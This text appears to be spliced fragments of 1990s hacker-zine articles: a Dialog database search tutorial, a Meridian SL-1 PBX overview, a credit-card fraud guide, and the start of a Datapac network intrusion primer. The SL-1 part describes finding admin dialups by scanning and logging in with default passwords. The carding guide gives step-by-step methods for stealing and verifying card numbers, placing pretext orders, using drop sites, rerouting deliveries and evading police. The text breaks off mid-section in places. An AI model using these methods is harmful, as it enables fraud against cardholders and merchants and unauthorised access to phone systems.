|  /DE   |     Descriptor     |  Word and Phrase | S COMPUTER AND CRIME/DE |
|        |                    |                  |                         |
|  /ID   |     Identifier     |  Word and Phrase | S COMPUTER AND CRIME/ID |
|        |                    |                  |                         |
|  /TI   |     Title          |      Word        | S COMPUTER AND CRIME/TI |
+--------------------------------------------------------------------------+

Truncation
----------

     Truncation permits you to search for different forms of a
search term.  On Dialog, the symbol is &quot;?&quot;.  For instance, if I wanted
to search for a word and I didn&#039;t know its exact spelling, I would do
the following:

ex. [Searching for the word Capone or Capoan, but not quite sure]

     ?  S CAPO?
          S1 122753  CAPO?

This also can be used in several other ways.  For instance, plurality,
or maximum number of letters following a word.  Example:

ex.  ?  S CAPO??

This maximizes the word search at two letters past the &quot;O&quot;.

ex.  ?  S CAPONE?

This finds the plurality in the word capone.

ex.  ?  S CAP?  ?

This finds the letters between the two question marks.


Proximity and Field Operators
-----------------------------

     Proximity operators specify the position of search terms in
relation to each other within a record or field.  If I wanted to search
for the words &quot;Legion&quot; and wanted to make sure that the word &quot;Doom&quot;
was within a certain area around it, I would use a proximity operator.
For instance:

? S LEGION(3W)DOOM
       932   LEGION
       812   DOOM
        27   LEGION(3W)DOOM

In the above example Doom was searched within three words of Legion.
You can use any number in place of the three.  The good thing about
this proximity operator is that it searches the second word from the
first on both sides.  Using the above example here is a picture of it:

         Doom &lt;---- 3 words ----&gt; Legion &lt;---- 3 words ----&gt; Doom

     A field operator allows two words to be within a field in any
order.  For example:

? S COMPUTER(F)CRIME/DE
       14321  COMPUTER/DE
        2720  CRIME/DE
          95  COMPUTER(F)CRIME/DE

This shows that in the descriptor section of a search, the words
computer and crime show up ninety-five times together.  They could be
completely unrelated, although this is doubtful.

     The L operator is used exclusively for the descriptor section.
This operator simply &quot;links&quot; the words together.  A search term looks
like this:

? S COMPUTER(L)CRIME

     The N operator is used similar to the W operator in that it
searches for a proximity of one word from another.  Here is an example
of a search:

? S COMPUTER(5N)CRIME

This searches for the words computer and crime within five words
of each other.  Another way the N is used is to search with words
that are the same, for instance the words: air-to-air, or
protein(N)protein.  The below example when using the &quot;N&quot; operator
shows in the text just why the file would be flagged by the search
program.  Notice the &quot;protein/protein&quot;.

? S PROTEIN(N)PROTEIN

... surfaces presumably as a result of dynamic process of protein
adsorption and desorption and protein / protein interaction.

Sample Record
-------------

     In order for me to discuss critical points in a found record
I first need to show the record itself.  The following record was
searched in the ERIC database (File number 1 - - $.50 per minute and
$30.00 per hour).

The TYPE Command
----------------

     The TYPE command is used to display your search results.  Once you
&quot;S&quot; the topic, you can display it in eight different formats.  Each
format costs a different price and varies with each database.  It is
usually more to display a full record than abstracts though.  The
command is listed as follows:

T (or TYPE) set/format/range of records

ex. T s1/5/1-20

This will &quot;type&quot; the results found in s1, show the whole record
(format 5), and display the first twenty records.  The command can
also be used to directly display an accession number as displayed
in the following:

T (or TYPE) accession number/format

ex. T EJ330267/5

This will display the full record of the &quot;Invitation to a Hacker&quot;
(the sample record). Note that most Dialog databases contain citations and
sometimes abstracts of articles but NOT the full text of the article. There
are some databases that do contain the full text of articles but most don&#039;t.
The reason most people search these databases is to get a bibliography
of articles that have been written on their topic. After reviewing the
results of their search, they can decide which if any, of the articles
published that they want a copy of. Obtaining full text copies of
articles is referred to as &#039;Document Delivery&#039; service. Sometimes you
will see that the newspaper, magazine, or journal that a specific article
you obtained a citation of is in your library and can just photocopy it
yourself. Other times, the journal may be in another library perhaps
hundreds of miles away, in which you can request it via ILL (Inter-Library
Loan). And if you have no clue where to find a copy of the source of
an article, you can ask Dialog or the individual database supplier to
get a copy for you, typically at a cost in upwards of $15.00 for an
article from 1 to 20 pages. Fifteen bucks is a bit steep for a 2 page
article, so be sure you really need it before ordering. Besides, most
articles don&#039;t contain as much info that the title or abstract implies
it does.

   If you need direct record access, with any options in the Dialog command
system, just input the accession number.  All eight formats are shown in the
following table.

User Defined Format Options
---------------------------

     If you are not satisfied with the eight formats, you can
modify the output to display exactly what you want.  The command
would look like the following:

ex. TYPE S3/AU,TI/1-5

This would exclusively show the author and the title in records
one through five.

The EXPAND Command
------------------

     The EXPAND command allows you to look through the database
like looking through a dictionary.  The command would look like this:

ex.         ? E AU=CAPONE, F
           Ref  Items  Index-term
           E1       4  AU=CAPONE, A
           E2      10  AU=CAPONE, B
           E3      55  AU=CAPONE, C
           E4       8  AU=CAPONE, D
           E5       4  AU=CAPONE, E
           E6       2  AU=CAPONE, F
           E7      10  AU=CAPONE, FA
           E8     912  AU=CAPONE, FB

This is an especially useful term or name if you don&#039;t know exactly what
you are looking for.

Conclusion
----------

     This file should give you an overview of the Dialog Information
System.  I exited the hacking world shortly after The Leftist, The
Urvile/Necron 99, and The Prophet were arrested in Operation Sundevil,
and Digital Logic&#039;s Data Service went down permanently along with my
sysop access.  It wasn&#039;t until a few years later did I reenter the
computer world to find a whole lot of things to have changed
including my hacker ethic.  I felt writing this file would be a
natural progression from my original hacking talents to &quot;hacking&quot; on
a legal basis.

     I would like to thank Erik Bloodaxe (for encouragement and
project ideas) and Lex Luthor (for more project ideas and editing).
If you have any questions or comments my Internet address is:
alcapone@mindvox.phantom.com.  On IRC, I am usually on either
#mindvox or #hack so look me up and say &quot;Hey!&quot;.

                               Introduction
                               ~~~~~~~~~~~~

 This article is the first in a possible series devoted to Northern
Telecom&#039;s line of Meridian SL-1 switches. At the moment, I&#039;m unsure if there
will even be a second article, since it would consist completely of the
programming of these switches, and it&#039;s not difficult for me, or anyone else
to type up a manual. If you haven&#039;t heard of an SL-1 before, to put things
simply, if you have ever called a Meridian Voice Mail system, this is the
computer that runs the show! Not all SL-1&#039;s have Voice Mail features, but
it makes things easier (for the electronic adventurer) if you have one that
does. Now it&#039;s far more than a simple voice mail system, it&#039;s a complete
phone switch, a PBX. Of course, like most computers, if you can gain access
to it, the system is at your beckon call, to do what you make it do. What
follows is a brief history, and technical overview of the SL-1 series, as
well as information on identifying them. If this looks familiar, a large
portion of this article appeared my own magazine, Freedom, but was updated
for Phrack. If you had read the issue relating to SL-1&#039;s, you will also
find basic programming information for some of the more commonly used
overlay programs, it was purposely omitted in this article.

   History and Technical Overview
   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 Development of Northern Electric&#039;s SL-1 started in 1971. Their
objective was to design a superior communications system for business
subscribers in the range of 100 to 7600 stations. The system had to encompass
all the features of a PBX, Centrex and key systems and be economically
competitive with them. It had to have new custom services not previously
feasible with the older systems. It had to be easy to learn and to operate.
As well, it had to be easy to install and maintain.

 What the designers came up with was a digital, stored program control
machine using an 8-bit PCM. They also came up with a new telephone instrument,
the SL-1 telephone, which is a multi-line instrument with many features, but
uses only 2 pairs of wires, instead of 25 pairs required by key telephones.

 The SL-1 system has three main parts: The common equipment (CE), the
peripheral equipment (PE) and the power supplies.

 The CE performs the central control and switching functions for all
the connecting lines and trunks. It has a central processing unit (CPU) and
read/write memory which stores all the operating programs and data unique
to the particular system, including switching sequences, feature and class
of service information, and numbers and types of terminals. Various models
use various media to store information, ranging from magnetic tape drives
to disk drives, for high-speed loading of the operating programs and data
into the read/write memory, and providing data restoration after a power
failure.  This media also contains the diagnostic routines, and all software
needed to program the switch. There is a Teletype to communicate to the system
with and to print error messages on. The network circuits perform the switching
duties for all lines and trunks. The digital service circuits provide for such
functions as dial and ringing tones and call conferencing.

 The CE units communicate over a common central bus under control of
the CPU. Speech signals, converted to digital, follow a separate path on a
network switching bus.

 The PE performs the interface between the line and trunk circuits and
the SL-1 system. It consists mainly of line and trunk cards which convert
analog speech to digital signals for digital switching and vice-versa. Lines
connect to individual instruments and trunks to other PBX&#039;s. Peripheral
buffers act as interface between the PE and the CE providing power control,
timing and switching control signals for the line and trunk circuits. Digital
conversion into 8-bit PCM is done by a single encoder/decoder (codec) for each
line or trunk. This codec is a custom LSI circuit.

 Between the PE and the CE, all signals travel in digital format on
time multiplexed loops. Each loops carriers 30 voice channels, one control
signalling channel and one unused channel. The channels operate at 64 kbps
to give a total data rate of 2.048 mbps. Each loops terminates on a different
circuit pack in the CE. There can be up to 16 multiplex loops.

 When a call is set up, the CPU assigns each party a channel from among
the 30 on their own multiplex loops. These channels form a matched pair. For
instance, the calling party may use channel 2 of it&#039;s digital loop, and the
called party may use channel 3 of it&#039;s loop.

 The SL-1 conducts audio digitally. The line and trunk cards contain
A/D and D/A converters. Received audio is changed to a digital signal and
put on a voice channel. At it&#039;s destination, the digital signal is converted
back to analog audio.

 All programming is done from a keyboard with the output going to a
printer. To program, a specific diagnostic program, called an overlay, is
selected, and is automatically loaded from tape or disk. Once this is done,
the appropriate commands are entered to change the options. All inputs, and
SL-1 responses are echoed on a printer or echoed out of the specified port.
If any system parameters or configurations are changed, these changes will
not survive a total power outage unless a new tape or disk is made.

 In case of a power outage, upon restoration of power, the SL-1 activates
the tape or disk unit and loads in the system operating data, and runs some
diagnostics. This takes from 5-15 minutes, and at the end of that time,
service is fully restored with all the options which were recorded on the tape
or disk being implemented. Of course any user-selected options like speed
call lists and call waiting which had been selected before the outage will
be lost.

 Automatic diagnostics (called &#039;background&#039; programs) are being run
constantly with the results of any problems being echoed to output. At
midnight a more thorough set of diagnostics are run. Any of the diagnostics
may be run on demand from the keyboard. Also available on demand from the
keyboard are a series of diagnostics to determine the status of lines and
trunks, to trace calls, and to print lists and traffic studies.

   Explanation of Some Features
   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Station to station calling - Any station can directly call any other station
without attendant assistance.

Direct Outward Dialing (DOD) - Allows a station to gain access to the exchange
network without attendant assistance and receives a second dialtone.

Hunting - Routes a call to an idle station directory number when the called
number is busy. The numbers in the hunt group do not have to be in sequence
nor do they have to appear on the same instrument. The sequence can be
consecutive (station directory numbers are hunted in ascending numerical
order) or non-consecutive.

Access to paging - Provides a connection to customer-owned paging equipment.

Access to Automatic Recorded Answering Equipment - SL-1 stations can have
incoming messages recorded on customer-provided answering equipment by
forwarding calls to the directory number (DN) assigned to the equipment.

Direct Inward Dialing (DID) - Allows an incoming call from the exchange
network to reach a station without attendant assistance. The DN for each
station will normally be the last 2,3 or 4 digits of the 7 digit exchange
network number.

Tandem Switching - The SL-1 can act as an intermediate switching point for
traffic between other PBX&#039;s.

Manual Service - Does not provide a dialtone when a station goes off-hook.
Instead the attendant is alerted and completes the call for the user.

Private Line Service - Permits the appearance of a private central office line
on an SL-1 Telephone set. Dialtone is received directly from the telco and
calls are not processed by the SL-1.

Multi-Customer Group Operation - Allows for the provision of services for more
than one business customer from the same switching machine. Each customer
is totally separate from the others, may have the same directory numbers as
the others, has his own attendant console, his own trunks, and cannot directly
call stations belonging to the other customers.

Service Restrictions - Allows the ability to restrict various functions.

Intercept - Disposes of calls which cannot be completed because of
restrictions or dialing errors. They are either routed to the attendant
or overflow tone.

Special Dial Tone - A Regular dialtone with three 128 ms interruptions at the
beginning to advise the user that his hookswitch flash has been successful.

Line Lockout - Disconnects stations which have been off-hook for too long to
prevent system problems.

Night Service - Allows the attendant to preconnect some or all of the incoming
telco trunks to selected DN&#039;s on the SL-1.

Emergency Transfer - Puts the system in the power fail transfer mode. This
transfers telco trunks to selected stations to provide some continuity of
service to the outside world during the time the SL-1 is inoperative.

Remote Administration and Maintenance - Permits operation of the diagnostics
from a remote location via a modem and telephone line. You may do anything
from the remote terminal that you can do from the local terminal.

Call Forward - Busy - Routes incoming calls to another number when the called
station is busy.

Call Forward - Don&#039;t answer - Routes incoming calls to another number when the
called station doesn&#039;t answer within a prescribed time.

Call Forward - Follow me - Routes incoming calls to another, programmable
number.

Call Waiting - Informs the user of a second incoming call while he is already
in conversation. He can then place the first caller on hold and answer the
second call. He can then return to the first call.

Conference - Allows a user to connect up to either 1 or 4 additional persons
into an existing call. Up to 2 of the users may be trunks.

Call Pickup - Allows a station to answer an incoming call to another station
in the same pickup group by dialing a special code.

Ring Again - Permits a calling station, on encountering a busy DN, to operate
a dedicated key or dial a special code to have the system monitor the called
station and alert him when it goes idle. He is then automatically connect to
that station when he goes off-hook or presses the key during the alert and the
system rings that station.

Data Transmission - The SL-1 is suitable for voiceband data transmissions
and is compatible with a conventional modem.

and the second part indicates the purpose of the software and serves as a
version number and also indicates the type of machine it can be used with. The
&#039;X&#039; stands for a 1 or 2 digit number representing the model:

11= SL1-NT    12= SL1-XT

        Maintenance Programs
        ~~~~~~~~~~~~~~~~~~~~

 All troubleshooting procedures, configuration changes and circuit
disabling/enabling are carried out from the keyboard of a Teletype via
software programs. There is virtually no physical contact with the exchange
other than required to remove a defective board and replace it with a spare.
Even this does not require tools.

 Before running a program you must first gain access to the computer.
The dialup will normally be a 1200 baud connection, with an even parity,
databits of 7, and stopbits of 1 (E71). Once connected press &lt;CR&gt; several
times key to wake the system up. The system SHOULD respond with &#039;OVL111 BKGD&#039;
or &#039;OVL111 IDLE&#039; and now you know it&#039;s alright to login. If the response is
&#039;OVL000&#039; and then a &#039;&gt;&#039; prompt you are already logged in, and you can go
straight to loading an overlay.

 Type &#039;LOGI&#039; to initiate the login. Make sure when entering commands
that they are all input in uppercase. The system responds with &#039;PASS?&#039;. Now
enter the password, (we do have a password, RIGHT?), it has a default, like
everything else. The password will always be a 4 digit number, other
characters are not valid. If you have correctly logged in, the system will
respond with a &#039;&gt;&#039; prompt. The system will display this prompt whenever
waiting for operator input and is not running a diagnostic program. Once
a diagnostic program is running the prompt becomes a &#039;.&#039; (period). If you
are not logged in, there is no prompt.

 What follows is an example of what you will see during login.

{ Hit Carriage Return }
OVL111 IDLE
.
.
.LOGI                        { Initiate Login                    }
PASS?                        { Enter password, it will not echo  }
OVL015                       { Error code for incorrect password }
TTY 01 SCH MTC    16:40

OVL 45 BKGD
.LOGI                        { Try again }
PASS?
.
&gt;
OVL000
&gt;LD 22           { You are now logged in and ready to load an overlay program }
   { in this case we are loading overlay 22, a print routine.   }
PT20000

REQ TID          { The REQ prompt appears, now enter your selection, in this }
   { case we want to print the TID (Tape ID)                   }
TAPE ID:
LOADED XXXXXX
DISK/TAPE   XXXXXX

REQ ISS          { Enter ISS to view the Issue and Release number of the     }
   { software/switch                                           }
VERSION 1011
RELEASE 14
ISSUE 39


REQ END          { Enter END to quit this overlay }
&gt;LOGO
&gt;
.                { Logout and hangup }


 Now after gaining this information, we can determine what type of
system we&#039;re dealing with. Notice that the version number is 1011. Now
refer back to the listing of SL-1 Models for the information we seek. We are
logged into an x11 system (last 2 digits of the version number). Unfortunately,
there are two system with x11 generics, and none of which have a release
number of 14, so we&#039;re either dealing with an SL1-M or an SL1-S, with either a
60-400 or 30-160 line capability respectively. Although this information isn&#039;t
extremely useful, it comes in handy when determining how large the system is.


         Overlay Programs
         ~~~~~~~~~~~~~~~~

 Upon first logging in, no program is loaded, and you must load a
program (overlay) into system memory. This is done by the command &#039;LD&#039;
followed by a space and the overlay number. To load overlay 10 you would
simply do a &#039;LD 10&#039;. It will take approximately 1 minute to load the overlay
into memory from tape, if the system uses a tape drive. If the system uses
disk storage then it will load quickly. Once the program is loaded, a &#039;REQ&#039;
(request) prompt will appear. The system is now waiting for input from the
administrator.

 There are many different overlays which can be used, all of which
are explained in the following section.

 Those are the main overlays used to modify setups and print the
system configuration information. SL-1&#039;s are mainly used in buildings, and
by larger companies, ranging from department stores to complete office
complexes. The dialups are commonly found on an extension of the PBX. You
can generally come across the dialup while scanning extensions on a Meridian
Voice Mail system. Meridian SL-1&#039;s are a very common switch used on WATS
lines, generally by larger companies. I&#039;ve also talked to several people who
have encountered the actual dialup modem to the switch on the public
phone network (exchange scanning). Once you have found one, it&#039;s easy to
identify with it&#039;s trademark &#039;OVL&#039; greeting.


          Meridian Manager
          ~~~~~~~~~~~~~~~~

 Obviously SL-1 administrators can&#039;t be expected to program a switch
using such archaic methods, and remembering every prompt and required input.
Northern Telecom has developed terminal software that makes the job easier,
which replaces the traditional teletype setup with a PC running their terminal
software. Each copy of the software is sold at upwards of $5000 for a site
license, and you are entered into a license agreement with NT. As Northern
Telecom puts it...

 &quot;Title to and ownership of Meridian SL-1 software shall at all times
remain with Northern Telecom. Meridian SL-1 software shall not be sold
outright and the use thereof by the customer shall be subject to the parties
entering into software agreement as specified by Northern Telecom.&quot;

 Each copy contains a serial number which matches the PBX&#039;s own serial
number, thus cannot be used on any switch other than one specified in your
license agreement. The software provides a user friendly method to add,
remove, and modify information, without dealing with the unfriendly switch
directly. Initially the software will phone the specified switch, and check
the serial number of the switch. After this, it will load and run the print
overlays, and ascii capture all output, building several database files
locally, on your own system. After this is completed, it disconnects, and
you now have the complete configuration of the switch sitting on your system.
You now make the necessary modifications, and upon completion, the software
again calls the switch, and updates the switches database. The software,
called the Meridian Manager, comes complete with a full internal tutorial on
how to use it, and is very helpful. Thanks Northern Telecom, for making it so
easy!

       Additional Information
       ~~~~~~~~~~~~~~~~~~~~~~

 If you require programming information, probably the handiest piece
of material that I&#039;ve found is the Data Administration, Generic X11 : Pocket
Reference Guide. This is a pocket book that contains a listing of all
Overlay Programs, possible inputs and error codes. The reference is about
100 pages, and can be ordered from Northern Telecom, the order number being
P0674785,S086/01. Social Engineering may be required.

* Meridian and SL-1 are trademarks of Northern Telecom Limited.

Greetings to Talsfalon, Akalabeth, Okinawa, Mechanix, and all those I&#039;ve
forgotten. See you at hohocon, we&#039;ll be giving away one of the previously
mentioned Pocket Reference Guide&#039;s at the raffle.

I can be reached at my email address, iceman@silicon.bison.mb.ca, or my own

    This file is ONLY to be published in Phrack, and has not and
 will not be released, or published in any other magazine.

    And a disclaimer: I do not engage in, or condone ANY illegal
 activity, including credit card fraud, and this article should
 be used for INFORMATIONAL PURPOSES ONLY.  Those wishing to
 engage in unlawful activities should be warned that there are
 severe penalties that exist that could render the remainder of
 your life useless.

    In the past few years, I have had a ton of people come up and
 ask, &quot;I want to card something, but I&#039;m afraid I&#039;ll get caught
 because I don&#039;t really know what I&#039;m doing, can u give me tips?&quot;
 This article is designed for those people, people who already
 have carded and are looking for better/easier ways to do it.
 One point you&#039;ll see me address VERY strongly in this article
 is safety.  I don&#039;t want to see any of my friends end up in
 jail.  See, like any unlawful activity, you are going to have
 certain risks, and this article is designed to ELIMINATE those
 risks, or narrow them down tremendously.  I&#039;m going to take
 you step by step through the ENTIRE process from the time you
 pick up the phone until the time you are safely at home
 reading the manual to your new toy.


Stage One - Getting the credit card information

    Getting the information is probably going to be the easiest of all
the steps involved here.  You could go trashing at your local restaurant,
retail store, or bank.  You could open up Federal Express boxes and find
them there.  You could hack into an establishment and get them from there.

    It doesn&#039;t really matter HOW you get it, but you want to make sure
you get the person&#039;s full name, their complete credit card number, their
expiration, and hopefully an address.  In the event that you found the
credit card number locally and just have the name, check your local White
Pages for their address or use a service like Compuserve to pull up their
address.  You&#039;ll probably find that the address closest to the store is the
right one.  Also, if you can get a hold of the issuing bank, this will help.

Stage Two - Verifying the credit card information

    There are several ways you can do this.  And remember when you are
doing this that it would be VERY helpful to get the available line of credit.

 1&gt; If you have the issuing bank, call the bank and ask for their
    AUTOMATED CREDIT SERVICE.  They ALL have them.  Its an 800 number
    and it&#039;s printed on the back of the card.  Basically, this service
    is set up so that credit card holders can check their available
    balance, available credit, etc.  Usually, they have SOME kind of
    security that prevents the normal person from walking up and
    typing in someone else&#039;s number.  This security is lame.  You
    either have to know the last 4 digits of their social security
    number or their zip code.  99 times out of 100, you&#039;ll find that
    you&#039;ll need their zip code though.

 2&gt; So you don&#039;t have the issuing bank? Just use a credit card verifier
    with a merchant number. Don&#039;t place a HUGE purchase, it can be any
    amount, so make it small, like say $8.31 or something.

 3&gt; Use a 800 porn service that accepts credit cards.

 4&gt; Use a credit bureau like CBI, TRW, or InfoAM.  These services
    are very nice because you can easily check their available
    credit line.  It also has other information that could be useful.

    Remember, when you are doing this, don&#039;t make the calls from your
house, and if it&#039;s impossible to do otherwise, go through a divertor and a
code.  Put a couple of levels of protection between YOU and them.  This
will cut down on any tracks leading back to you.

Stage Three - Finding the company

    You are looking for a relatively small company - one that has
what you need in stock, but not one that needs operators to answer calls.
Most places (even retail stores like Radio Shack) will ship out to anyone
any place in the US.  Just tell them you are handicap, or can&#039;t get around
very well, and they will be more than happy to help.  You want to find a
place that has Federal Express.  And of course, you&#039;re looking for one
that accepts the type of card that you have.  Incidentally, for those who
are VERY new at this :

    If first digit of card is a:

                    3 American Express (15 digits)
                    4 Visa             (13 or 16 digits)
                    5 Mastercard       (16 digits)
                    6 Discover         (16 digits)

Stage Four - Placing the call

    Ok, before we go any further, make sure you have a call back number.
I use a VMB that is in the local area that I&#039;m supposedly calling from.
You should almost always be calling for a business, because companies treat
businesses better than your standard customer.  Tell them you need to have
the products the VERY next day, and if they can&#039;t have it to you by then,
tell them you&#039;ll find another company (Hell, who wants to wait? :) )
When you call them, just relax, and pretend like your just placing an order
for yourself, nothing is out of the ordinary, but you just need to start
that special project in the morning.  Make sure you have all the information
in front of you.  Call during business hours, not on Friday, Saturday, or
Sunday.  Here&#039;s a transcript of one of my calls:

    &quot;Hello XXX, this is Mark can I help you?&quot; (always get their name)

    &quot;Yes, My name is Joe and I&#039;m calling from XXX, I&#039;d like to place
     an order.&quot;

    &quot;Ok sir, I&#039;d more than happy to help you, let me get some info
     from you first.  Ok. Can I have your name?&quot;

    &quot;Joseph XXX&quot;

    &quot;Your address, Joe?&quot;

    &quot;XXXX XXXX lane, and thats in XXXXXXX XX, the zip there is XXXXX&quot;

    &quot;Ok, and a number where we can reach you if there is any problems?&quot;

    &quot;XXX-XXX-XXXX&quot;

    &quot;Ok, what would you like to order?&quot;

    &quot;I need four of those laser jet printers, I believe I spoke with
     someone on Friday about them, and the part number is XXXXX-XX.
     Also, I had a question on those printers too, what type of
     warranty do they carry?&quot; (Always ask about warranty!)

    &quot;Well sir, these particular models have one year parts and labor
     warranty.  You can buy an additional 5 year warranty for only
     $49 a piece too.  We have an unconditional guarantee of 90 days.&quot;

    &quot;Ok, I&#039;ll take the 5 year warranty on all of them then.&quot;

    &quot;Do you need any toner cartridges, or printer paper?&quot;

    &quot;No, all I need are the printers.&quot;

    &quot;Ok, how would you like these shipped?&quot;

    &quot;You have Federal Express, right?&quot;

    &quot;Yeah.&quot;

    &quot;Ok, Ship them PRIORITY overnight then.&quot;

    &quot;Ok, and how are you paying for your order?&quot;

    &quot;With our corporate XXXXXX card.&quot;

    &quot;Ok, can I have your account number?&quot;

    &quot;Sure its XXXX-XXXX-XXXX-XXXX&quot;

    &quot;Ok, and the Billing information is the same as your ship to
     address ?&quot;

    &quot;Thats right.&quot;

    &quot;Ok, then this package will go out today, and you&#039;ll have the
     printers by tomorrow morning.&quot;

    &quot;Ok, and can you do me a favor?&quot;

    &quot;Sure.&quot;

    &quot;Whenever your shipping department ships the package, get the
     Federal Express Tracking Number for me, and leave it on my
     Voice Mail System?&quot;

    &quot;Sure, I&#039;ll do that personally later on tonight.&quot;

    &quot;Ok. Thank you very much.&quot;

    &quot;Thank YOU sir.&quot;

    Ok - a few things I want to mention.  First, try to determine what type
of credit card authorization they have.  If its retail store, they probably
just have ZION terminals, just the standard type or swipe style.  These don&#039;t
check the address, or anything, just to make sure the card is valid and
has enough credit left.  The other type check all the info, including the
name and address.  Its very important that you are SHIPPING to the BILLING
address, because if you change the ship to, they may have a tendency to
get a tad suspicious.  Also, the reason you could use that you need the
Fedex Tracking Number is for your Mail room.  Use your imagination, but
keep your story the same, don&#039;t adlib too much, cause you may fuck up,
but stick to the above format, it works very well.  Always try to be as
pleasant as possible, because in the event you couldn&#039;t check the credit
limit, you may have to give them another card.

Stage 5 - Finding a drop site

    This is one of the harder things to do.  If the billing address
of the card is local to you, you may just want to go their house to pick up
the package.  If not, find an apartment building close (but not too close)
to where you live.  Or find a house that has a for sale sign in the front
yard.  Or if you know some school buddy of yours that is away for vacation
use his house (In that event, make SURE he has NO idea your doing this)
Whatever the case may be, just find a place that is relatively secluded from
the street, where there are places for you to park inconspicuously.
Apartment buildings work EXTREMELY well.

Stage 6 - Rerouting the package

    This is a little trick one of my good friends showed me.  It works
extremely well.  Call up Federal Express with your airbill number.  The
number is 800-238-5355.  Tell them that you are not going to be in town
that day to sign for your package that you will be at another location,
and ask them if they could please send the package to a new address.  They
may say that it will take an additional day to do that, depending on how
far away it is.  INSIST that it arrives the next day, tell them its
extremely important, and don&#039;t take any shit from them, ask for their
supervisor if they gave you any problems.  Their commitment is
overnight.  By the way, call Federal Express AS SOON AS you know they
physically have the package, this way you give them as much time as they
need to reroute.  Obviously your sending the package to your drop site that
you found.

Stage 7 - Picking up the package

    This is by far the most DANGEROUS part of it.  If you are going to
get caught, this is where its going to happen.  DON&#039;T have a school buddy
pick it up for you.  Instant doom.  DON&#039;T pay someone to do it for you,
lord knows they will sell you out in a second.  Not to mention, you&#039;re
probably brighter than the average eggplant, so you may be able to talk
your way out. &quot;A guy on the street paid me this $20 bill to do it, I said
what the fuck&quot;  PLEASE USE EXTREME CAUTION WHEN DOING THIS.

    OK. Call Federal Express, and make sure the package will be arriving
that day, and that everything is on schedule.  Ask them what the route number
is, an estimate of when it will be there, and their commitment time for
that particular zip code.  Then, go there earlier than you need to be, and
check out the place, look around for anyone who seems abnormal, look for
escape routes, exits.  Look around, get a feel for where you are, and try
to ration out why you might just be standing there or why you would have
needed to pick up the package.  Remember, if you used all the precautions
I&#039;ve talked about, you should be in perfect shape.  Just relax, be cool, and
everything will work out.

    Walk around for a little bit, and find out the possible directions
the Federal Express Van will be coming from.  Walk in front of the house
just when he arrives. Pretend as though your just on your way home or just
on your way out the door.  Sign for it, and you&#039;re done.

    Ok, you say, I&#039;m the nervous type, and I don&#039;t want the guy giving
my description to the police, FBI, etc. (As though they will remember 1 out
of the hundreds of deliveries a day)  Call up Federal Express and ask for
a signature release.  This gives Fedex the right to leave the package at
your front door, and this removes their responsibility.  OR, leave a note
with your signature (not printed) on the door, mailbox, etc.  Remember though
that the guy may come home (or look out his window) and see the package, or
you signing it.

    Remember there is nothing saying that you have to be there when the
package arrives.  You can get a signature release or leave a note.  Make
sure you are there as soon as possible AFTER they leave the package.  I
actually prefer to be there, because when I just let it go, and check back
later, it is almost NEVER there.  Either a&gt; someone stole it b&gt; a neighbor
picked it up and put it in their house for them c&gt; the owner is actually
home and got the package (which is REALLY bogus, cause it&#039;s on their card!)

    I have ALWAYS used an apartment building.  I have ALWAYS been there
to pick the package up.  I have never been busted.  See, if you understand
how the system works, you know that there is NO way that anyone knows that
it is an illegal purchase.  If you look at it on a time line :

  &lt;----2:00pm-------2:05pm------8:00pm-----10am---&gt;
       verify       call        reroute    pickup

    Now, if there is a problem, it will probably be either a&gt; not enough
credit left on the card (which is nothing, they will leave a message on your
vmb) b&gt; they called directory assistance and actually called that number or
c&gt; VISA/MC/AMEX/DISC called the customer to verify the purchase because it
was larger than usual.

    So obviously, if they got in touch with the card holder, or visa/etc
called the card holder, they AREN&#039;T going to ship the package - meaning you
aren&#039;t going to show up anyways.  Of course you never use a drop site more
than once, you never use a company more than once, and you never use a card
more than once.

    Once you get your package, KEEP YOUR MOUTH SHUT.  Don&#039;t jump on IRC,
and say, &quot;Hey Cameron, I just carded a new Amiga 4000.&quot;  And if you do
eventually tell someone that you carded it, NEVER USE ANY SPECIFICS, no
information about the company, the drop house, the name on the card, NOTHING.
If you follow these instructions, you can guarantee you will have absolutely
no problems, I have been doing this for quite some time, and have NEVER been
bothered by any law enforcement concerning this.  I have never found anyone
who was careful that got busted.  The people who have gotten busted for
carding have either bragged about it, or let someone know before hand, or have
been set up.

    I have tried to cover all bases, but I&#039;m positive I&#039;ve missed a few
so if anyone has questions, let me know.  I am always open to helping people
and can be found on the IRC, in either #hack or one of the better #hack
alternatives.

    In addition to carding by phone, there is another possibility, that
is writing credit cards with a magnetic stripe writer.  A certain group did
this for EIGHT years, before getting caught.  This is worth a whole article
to itself, but I&#039;ll just go over some guidelines.

    Track I is 210 bpi. Track II is 75 bpi.

    The next chart shows the Magnetic Stripe Data Format (Track I)

    9         1         LRC

    &quot;The LRC is calculated by performing a BITWISE XOR (Exclusive OR) on all
ASCII values of the characters in the Inquiry - EXCLUDING the &lt;STX&gt; but
INCLUDING the &lt;ETX&gt;.&quot;

&lt;STX&gt; is HEX 02.
&lt;ETX&gt; is HEX 03.

      the delicacy of this topic.  I appreciate them sharing their knowledge
      with me, and I feel I&#039;m kind of returning the favor by writing this
      article.  Thanks also go out to the Phrack Staff, both past and present
      for putting out an excellent magazine, and continuing to distribute
      information to the computer underground.

    All of us I am sure have read penultimate files on the workings of
Tymnet or in some cases Sprintnet. These are staples in a hacker&#039;s diet.
In fact any second rate &quot;underground&quot; BBS has complete sections on BT
North America and the nets available therein. However one such net you
will most likely see very little on, is Datapac.

    Datapac was originated in the late seventies by Telecom Canada, a
large partnership of Telcos and businesses interested in high speed data
transfers between Business &amp; Government systems which would be hassle free
and cheaper in the long run. (The birth of most PSN&#039;s really.)

    The significance of Datapac however is that it has changed very little
by way of security in the past ten years, although it has extended
access to most of the globe in one fashion or another. Datapac is not
only a hacker&#039;s utopia due to lax (in some cases non-existant) security;
it is also, for the most part, safe ground (this term is, of course, used
somewhat lightly) for beginners and the unsure to try their luck/skill
at the game of packet switched network hacking. The Datapac net is most
important to Canadian Hackers who have direct access to it, and
therefore (if you&#039;re lucky) direct access to the world.

                       Connecting and Addressing

    Once connected you will need to type one or three periods and a
carriage return, this will produce a numerical format denoting your port
address and node,
                           XXXX XXXX
    PORT Address-----------^    ^
    NODE number-----------------^

    Once this is established the network simply sits and waits for you to
spit commands at it, in other words an address to whence you would like to
travel. Failing this, idle time will have you disconnected, the time
varies but averages around 1 or 2 minutes.

    The formatting of a Datapac address is really quite simple and is
most often 8 digits long (sometimes ten but we&#039;ll get to that later)
The first four (the prefix) specify the current location in Canada,
for instance large cities will have several, just as they will have
